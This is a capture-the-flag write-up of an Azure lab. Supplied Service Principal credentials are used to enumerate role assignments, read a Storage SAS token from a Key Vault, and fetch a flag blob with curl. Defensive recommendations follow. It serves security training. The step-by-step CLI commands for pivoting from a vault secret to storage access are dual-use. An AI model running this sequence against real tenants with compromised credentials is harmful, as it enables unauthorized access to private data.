# Azure Key Vault to Storage SAS Token Exposure

## Challenge Overview

### Objective

The objective of this challenge was to use the provided Azure Service Principal credentials to enumerate the assigned permissions, access an Azure Key Vault, retrieve a stored Storage Account SAS token, and use that token to access a protected Blob Storage container and retrieve the flag.

### Scenario

The challenge provided a Client ID and Client Secret for an Azure Service Principal.

The initial Service Principal had limited access within the Azure subscription. During enumeration, a `Key Vault Secrets User` role assignment was identified on a specific Key Vault.

The Key Vault contained a Storage Account SAS token. Although the Service Principal did not have sufficient Azure Storage data-plane permissions to directly read blobs using its own identity, the SAS token retrieved from the Key Vault provided the required access to the Blob Storage container.

This created an indirect privilege escalation path from the initial Service Principal to sensitive data stored in Azure Blob Storage.

### Skills Practiced

* Azure Service Principal authentication
* Azure RBAC enumeration
* Key Vault secret enumeration
* Azure Storage enumeration
* SAS token usage
* Azure Blob Storage access
* Cloud privilege escalation analysis

---

# Environment

## Cloud Provider

Azure

## Initial Access

The challenge provided:

* Client ID
* Client Secret
* Tenant ID obtained from the Azure issuer

The Service Principal was:

`secopprobacksp`

## Available Tools

* Azure CLI
* PowerShell
* curl

---

# Attack Methodology

## Initial Hypothesis

The initial objective was to determine what resources and permissions were available to the compromised Service Principal.

The first step was to authenticate to Azure and enumerate the subscription, Service Principal, role assignments, and available Key Vault resources.

Expected targets:

* Azure Key Vault
* Azure Storage Account
* Key Vault secrets
* Blob Storage containers

The issuer provided for the tenant was:

`https://sts.windows.net/f2a33211-e46a-4c92-b84d-aff06c2cd13f`

The Tenant ID was extracted from the GUID at the end of the issuer:

`f2a33211-e46a-4c92-b84d-aff06c2cd13f`

---

# Attack Workflow

The attack was performed by gradually expanding access and identifying credentials stored within accessible cloud resources.

## Step 1 - Initial Access Validation

### Action

Authenticate to Azure using the provided Service Principal credentials.

Command:

```powershell
az login --service-principal --username "<CLIENT_ID>" --password "<CLIENT_SECRET>" --tenant "<TENANT_ID>"
```

The login was successful.

The current Azure account was then validated:

```powershell
az account show
```

Result:

```text
"environmentName": "AzureCloud",
"homeTenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
"id": "662a4fee-a3ba-49b3-9caf-8c20ed04503f",
"name": "Prod",
"state": "Enabled",
"tenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
"user": {
  "name": "76e1a895-1f05-4165-83ab-98eed07bed86",
  "type": "servicePrincipal"
}
```

Observation:

The provided Client ID and Client Secret were valid and provided access to the `Prod` subscription.

---

## Step 2 - Service Principal Enumeration

### Goal

Identify the Service Principal and determine its assigned Azure RBAC permissions.

Command:

```powershell
az ad sp show --id "<CLIENT_ID>"
```

The Service Principal was identified as:

```text
appDisplayName: secopprobacksp
appId: 76e1a895-1f05-4165-83ab-98eed07bed86
id: 2903a6a7-87c7-45dc-96b8-dc5bf8546d87
servicePrincipalType: Application
```

Role assignments were then enumerated:

```powershell
az role assignment list --assignee "<CLIENT_ID>" --all -o table
```

Result:

```text
Principal                             Role                    Scope
------------------------------------  ----------------------  ---------------------------------------------------------------------------------------------------------------------------------
76e1a895-1f05-4165-83ab-98eed07bed86  Reader                  /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG
76e1a895-1f05-4165-83ab-98eed07bed86  Key Vault Secrets User  /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv
```

Findings:

* The Service Principal had `Reader` access to `DataBack-RG`.
* The Service Principal had `Key Vault Secrets User` access to `secopprobackkv`.
* The Key Vault role provided access to secrets stored in the vault.
* No direct Storage Blob Data role was identified at this stage.

---

## Step 3 - Key Vault Enumeration

### Goal

Identify accessible Key Vault resources and enumerate their secrets.

The resources in the resource group were enumerated:

```powershell
az resource list --resource-group DataBack-RG -o table
```

Result:

```text
Name            ResourceGroup    Location    Type                               Status
--------------  ---------------  ----------  ---------------------------------  ---------
secopprobacksa  DataBack-RG      eastus      Microsoft.Storage/storageAccounts  Succeeded
secopprobackkv  DataBack-RG      eastus      Microsoft.KeyVault/vaults          Succeeded
```

The Key Vault was then queried:

```powershell
az keyvault secret list --vault-name secopprobackkv -o table
```

Result:

```text
Name                     Id                                                                      ContentType    Enabled    Expires
-----------------------  ----------------------------------------------------------------------  -------------  ---------  ---------
secopprobacksaSAASToken  https://secopprobackkv.vault.azure.net/secrets/secopprobacksaSAASToken                 True
```

Findings:

* The Key Vault contained a secret named `secopprobacksaSAASToken`.
* The naming strongly suggested that the secret contained credentials for the Storage Account `secopprobacksa`.

---

## Step 4 - Retrieve the Key Vault Secret

### Misconfiguration Identified

The compromised Service Principal had the `Key Vault Secrets User` role on the target Key Vault.

This allowed the Service Principal to retrieve the value of the stored secret.

Command:

```powershell
az keyvault secret show --vault-name secopprobackkv --name secopprobacksaSAASToken
```

The secret contained an Azure Storage SAS token.

The important parameters included:

```text
sv=2024-11-04
ss=bfqt
srt=sco
sp=rltfx
```

The SAS token was valid for the Storage Account and provided permissions that included read and list operations.

Observation:

The Key Vault secret effectively contained a second set of credentials that could be used to access the Storage Account data plane.

This created the following trust chain:

```text
Service Principal
        |
        v
Key Vault Secrets User
        |
        v
Key Vault Secret
        |
        v
Storage SAS Token
```

---

## Step 5 - Storage Account Enumeration

### Goal

Determine whether the Storage Account identified by the secret existed and enumerate its available containers.

Command:

```powershell
az storage account list -o table
```

The target Storage Account was confirmed as:

```text
secopprobacksa
```

The resource group was also confirmed to contain:

```text
secopprobacksa
secopprobackkv
```

The available Blob Storage containers were enumerated:

```powershell
az storage container list --account-name secopprobacksa --auth-mode login
```

Result:

```text
name: secopprobacksc
```

Observation:

The Service Principal could enumerate Storage container metadata, but it did not have sufficient Storage Blob Data permissions to read blobs directly using Azure AD authentication.

---

## Step 6 - Use the SAS Token to Access Blob Storage

### Goal

Use the SAS token retrieved from Key Vault to access the Storage Account data plane.

The Azure CLI authentication method using the Service Principal failed when attempting to list blobs:

```powershell
az storage blob list --account-name secopprobacksa --container-name secopprobacksc --auth-mode login
```

Result:

```text
You do not have the required permissions needed to perform this operation.

Depending on your operation, you may need to be assigned one of the following roles:
    "Storage Blob Data Owner"
    "Storage Blob Data Contributor"
    "Storage Blob Data Reader"
```

This confirmed that the Service Principal itself did not have a suitable Storage Blob Data role.

The retrieved SAS token was therefore used directly against the Blob Storage REST endpoint.

Command:

```powershell
curl.exe "https://secopprobacksa.blob.core.windows.net/secopprobacksc?restype=container&comp=list&sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=<SAS_SIGNATURE>"
```

Result:

```xml
<EnumerationResults ServiceEndpoint="https://secopprobacksa.blob.core.windows.net/" ContainerName="secopprobacksc">
<Blobs>
<Blob>
<Name>Flag.txt</Name>
<Properties>
<Creation-Time>Tue, 15 Oct 2024 10:02:22 GMT</Creation-Time>
<Last-Modified>Tue, 15 Oct 2024 10:02:22 GMT</Last-Modified>
<Content-Length>26</Content-Length>
<Content-Type>application/txt</Content-Type>
<BlobType>BlockBlob</BlobType>
<AccessTier>Hot</AccessTier>
<ServerEncrypted>true</ServerEncrypted>
</Properties>
</Blob>
</Blobs>
<NextMarker/>
</EnumerationResults>
```

Finding:

The SAS token successfully granted access to the Blob Storage container and revealed the target blob:

```text
Flag.txt
```

---

## Step 7 - Access Target Resource

### Target

Azure Blob Storage:

```text
Storage Account: secopprobacksa
Container: secopprobacksc
Blob: Flag.txt
```

The blob could be retrieved using the SAS token:

```powershell
curl.exe "https://secopprobacksa.blob.core.windows.net/secopprobacksc/Flag.txt?sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=<SAS_SIGNATURE>"
```

The response contained the challenge flag.

---

# Attack Chain

```text
Client ID + Client Secret
        |
        v
Azure Service Principal Authentication
        |
        v
RBAC Enumeration
        |
        v
Key Vault Secrets User
        |
        v
secopprobackkv
        |
        v
secopprobacksaSAASToken
        |
        v
Azure Storage SAS Token
        |
        v
secopprobacksa
        |
        v
secopprobacksc
        |
        v
Flag.txt
        |
        v
Sensitive Data Retrieval
```

---

# Findings

## Security Weakness

The primary security weakness was excessive exposure of a sensitive Storage Account SAS token through a Key Vault secret accessible to the compromised Service Principal.

The Service Principal was intentionally limited from directly accessing Blob data:

```text
No Storage Blob Data Reader
No Storage Blob Data Contributor
No Storage Blob Data Owner
```

However, it was granted:

```text
Key Vault Secrets User
```

on a Key Vault containing a valid Storage SAS token.

As a result, the effective permissions of the Service Principal exceeded its apparent direct Storage permissions.

The attack demonstrated that protecting a resource with RBAC is insufficient if an identity can retrieve another credential that independently grants access to the same resource.

## Impact

An attacker who compromises the Service Principal credentials could:

1. Authenticate to Azure.
2. Enumerate assigned RBAC permissions.
3. Access the Key Vault.
4. Retrieve the Storage SAS token.
5. Authenticate directly to Azure Blob Storage.
6. Enumerate the target container.
7. Read sensitive blobs such as `Flag.txt`.

The impact therefore extends beyond the permissions directly assigned to the Service Principal.

---

# Evidence

Important commands and outputs:

```text
az account show

az ad sp show --id "<CLIENT_ID>"

az role assignment list --assignee "<CLIENT_ID>" --all -o table

az resource list --resource-group DataBack-RG -o table

az keyvault secret list --vault-name secopprobackkv -o table

az keyvault secret show --vault-name secopprobackkv --name secopprobacksaSAASToken

az storage container list --account-name secopprobacksa --auth-mode login

az storage blob list --account-name secopprobacksa --container-name secopprobacksc --auth-mode login

curl.exe "<BLOB_STORAGE_SAS_URL>"
```

The final enumeration of the Blob container revealed:

```text
Flag.txt
```

---

# Defensive Recommendations

* Apply least-privilege RBAC to Service Principals.
* Avoid storing long-lived or broadly scoped SAS tokens in secrets accessible to application identities unless strictly necessary.
* Prefer Microsoft Entra ID authentication and managed identities over static SAS credentials where possible.
* Use narrowly scoped SAS tokens with the minimum required permissions.
* Restrict SAS lifetime and avoid unnecessarily long expiration periods.
* Avoid granting `Key Vault Secrets User` access when an application only requires a specific secret.
* Separate secrets containing credentials for different cloud resources.
* Regularly review Key Vault RBAC assignments.
* Regularly audit the effective permissions of Service Principals.
* Monitor Key Vault secret access and Storage data-plane activity.
* Enable Azure diagnostic logging and alert on unusual secret retrieval followed by Storage access.
* Rotate exposed SAS tokens and other credentials immediately after compromise.

---

# Key Takeaways

* Azure RBAC permissions should be evaluated together with credentials stored in accessible Key Vault secrets.
* `Key Vault Secrets User` can become a powerful privilege-escalation path when secrets contain credentials for other Azure resources.
* Azure Resource Manager permissions and Storage data-plane permissions are separate.
* A Service Principal may be unable to read Blob data directly while still being able to retrieve a credential that grants Blob access.
* SAS tokens provide independent authorization to Azure Storage and can bypass the original identity's Storage RBAC restrictions.
* Effective cloud privilege should be evaluated based on the credentials an identity can obtain, not only its directly assigned roles.

---

# References

* Microsoft Azure CLI documentation
* Microsoft Azure Key Vault documentation
* Microsoft Azure RBAC documentation
* Microsoft Azure Storage Blob documentation
* Microsoft Azure Shared Access Signature (SAS) documentation
